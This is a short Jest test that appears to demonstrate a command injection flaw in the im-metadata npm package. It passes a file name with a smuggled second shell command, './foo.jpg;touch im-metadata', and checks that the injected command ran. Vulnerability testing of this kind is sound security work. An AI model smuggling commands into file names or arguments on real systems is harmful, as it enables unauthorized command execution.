test("Command Injection in im-metadata", (done) => {
  expect.assertions(2);
  const metadata = require("im-metadata");
  const fs = require("fs");
  const path = "./im-metadata";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  metadata("./foo.jpg;touch im-metadata", { exif: true }, function (
    error,
    metadata
  ) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
